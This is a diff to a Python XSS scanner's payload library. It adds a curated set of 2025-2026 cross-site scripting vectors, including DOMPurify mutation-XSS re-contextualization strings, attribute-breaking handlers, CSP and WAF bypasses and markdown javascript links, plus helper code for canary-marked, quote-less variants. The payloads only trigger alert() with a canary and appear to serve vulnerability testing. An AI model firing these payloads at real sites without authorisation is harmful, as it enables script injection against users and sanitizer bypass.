@@ -364,6 +364,86 @@ CURATED["rcdata"] = [
 CURATED["firewall"] = CURATED["waf"]
 
 # ---------------------------------------------------------------------------
+# Real-world / disclosed-bug vectors (2025-2026) drawn from public writeups.
+# Sources: DOMPurify rawtext re-contextualization mXSS (CVE-2026-0540 /
+# CVE-2026-3126 / CVE-2026-65914, Fluid Attacks + caverav + cure53 wiki),
+# Google Search noscript mXSS (Masato Kinugawa), mizu.re DOMPurify
+# misconfiguration research, PortSwigger XSS contexts 2026, BBLabs mXSS notes.
+# Kept separate so provenance is clear; merged into categories in _build().
+# ---------------------------------------------------------------------------
+
+REALWORLD_2026 = {
+    "mxss": [
+        # DOMPurify rawtext/RCDATA re-contextualization (SAFE_FOR_XML gap).
+        ("dp-xmp-recontext", "<img src=x alt=\"</xmp><img src=x onerror=alert('__M__')>\">"),
+        ("dp-noscript-recontext", "<noscript><p title=\"</noscript><img src=x onerror=alert('__M__')>\">"),
+        ("dp-textarea-recontext", "<textarea><p title=\"</textarea><img src=x onerror=alert('__M__')>\">"),
+        ("dp-iframe-recontext", "<iframe><p title=\"</iframe><img src=x onerror=alert('__M__')>\">"),
+        ("dp-noembed-recontext", "<noembed><p title=\"</noembed><img src=x onerror=alert('__M__')>\">"),
+        ("dp-noframes-recontext", "<noframes><p title=\"</noframes><img src=x onerror=alert('__M__')>\">"),
+        # Attribute / style context re-parse.
+        ("dp-style-attr", "<style>a[href=\"</style><img src=x onerror=alert('__M__')\">\"] {}</style>"),
+        ("dp-div-textarea", "<div id=\"</textarea><img src=x onerror=alert('__M__')>\"></div>"),
+        # Google Search noscript mXSS (scripting-flag parse differential).
+        ("google-noscript", "<noscript><a alt=\"</noscript><img src onerror=alert('__M__')\">\">Hello</a></noscript>"),
+    ],
+    "html": [
+        ("foreignobject-iframe", "<svg><foreignObject><iframe src=javascript:alert('__M__')></iframe></foreignObject></svg>"),
+        ("math-mi-href", "<math><mi xlink:href=\"javascript:alert('__M__')\">click</mi></math>"),
+        ("comment-broken", "<!--><img src=x onerror=alert('__M__')>"),
+        ("svg-title-break", "<svg><p title=\"</title><img src=x onerror=alert('__M__')\">\"></p></svg>"),
+    ],
+    "attr_dq": [
+        ("autofocus-repair", "\" autofocus onfocus=alert('__M__') x=\""),
+        ("onformdata", "\" onformdata=alert('__M__') x=\""),
+        ("style-cv", "\" style=content-visibility:auto oncontentvisibilityautostatechange=alert('__M__') x=\""),
+    ],
+    "attr_sq": [
+        ("autofocus-repair", "' autofocus onfocus=alert('__M__') x='"),
+        ("apos-entity", "&apos;-alert('__M__')-&apos;"),
+        ("onbeforetoggle", "' onbeforetoggle=alert('__M__') x='"),
+    ],
+    "attr_unquoted": [
+        ("autofocus-repair", " autofocus onfocus=alert('__M__') x="),
+        ("onformdata", " onformdata=alert('__M__') x="),
+    ],
+    "script": [
+        ("minus-break", "'-alert('__M__')-'"),
+        ("throw-no-parens", "onerror=alert;throw'__M__'"),
+        ("close-tag-img", "</script><img src=1 onerror=alert('__M__')>"),
+    ],
+    "comment": [
+        ("broken-open", "<!--><img src=x onerror=alert('__M__')>"),
+        ("broken-open-end", "<!--><svg onload=alert('__M__')>-->"),
+    ],
+    "csp": [
+        ("meta-refresh-data", "<meta http-equiv=refresh content=\"0;url=data:text/html,<script>alert('__M__')</script>\">"),
+        ("base-js-prefix", "<base href=\"javascript:/a/-alert('__M__')//\">"),
+        ("data-js-src", "<script src=\"data:text/javascript,alert('__M__')\"></script>"),
+        ("svg-use-data", "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href=1 onerror=alert('__M__')/></svg>#x\">"),
+    ],
+    "waf": [
+        ("svg-confirm", "<svg onload=confirm('__M__')>"),
+        ("svg-prompt", "<svg onload=prompt('__M__')>"),
+        ("body-pageshow", "<body onpageshow=alert('__M__')>"),
+        ("details-toggle", "<details open ontoggle=alert('__M__')>"),
+        ("svg-slash-event", "<svg/onload=alert('__M__')//>"),
+    ],
+    "url": [
+        ("js-comment-poly", "javascript:/*--></title></style></textarea></script><svg/onload=alert('__M__')//"),
+        ("data-svg", "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload=alert('__M__')>"),
+    ],
+    "markdown": [
+        ("img-onerror", "![x](x\"onerror=\"alert('__M__'))"),
+        ("link-js-entity", "[x](javascript&colon;alert('__M__'))"),
+    ],
+    "dom": [
+        ("svg-use-data", "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href=1 onerror=alert('__M__')/></svg>#x\">"),
+    ],
+}
+
+
+# ---------------------------------------------------------------------------
 # 2026 vectors: modern event handlers, popover API, hidden-input escape,
 # mXSS parser-differential and framework escape hatches.
 # Sources: PortSwigger XSS cheat sheet 2026, chs.us context guide,
@@ -1339,6 +1419,8 @@ def _build():
     for cat in ("html", "attr_dq", "attr_sq", "attr_unquoted", "svg",
                 "mxss", "rcdata", "comment", "url"):
         payloads.setdefault(cat, []).extend(MODERN_VECTORS)
+    for cat, items in REALWORLD_2026.items():
+        payloads.setdefault(cat, []).extend(items)
     corp = _gen_corpus_categories()
     payloads["html"].extend(corp["corpus_html"])
     payloads["url"].extend(corp["corpus_url"])
@@ -1358,6 +1440,8 @@ def _build():
                 line = line.rstrip("\n")
                 if line and not line.startswith("#"):
                     payloads["polyglot"].append(("polyglot:innerht", line))
+    if "waf" in payloads:
+        payloads["firewall"] = list(payloads["waf"])
     for k in payloads:
         payloads[k] = _dedupe(payloads[k])
     return payloads
@@ -1636,6 +1720,19 @@ def set_canary_style(style):
     global CANARY_STYLE
     if style in _CANARY_WRAP:
         CANARY_STYLE = style
+
+
+def canaryize_noquote(payload, token, style="regex"):
+    """Return a quote-less variant of an already-canaryized payload.
+
+    Used to auto-escalate a quote-mangled (backslash/HTML-escaped) reflection:
+    alert('TOKEN') -> alert(/TOKEN/) or alert(`TOKEN`), both survive filters
+    that mangle quotes while still carrying the observable canary.
+    """
+    wrap = _CANARY_WRAP.get(style)
+    if not wrap:
+        return payload
+    return _noquote(payload, wrap)
 
 
 def canaryize(payload, token):
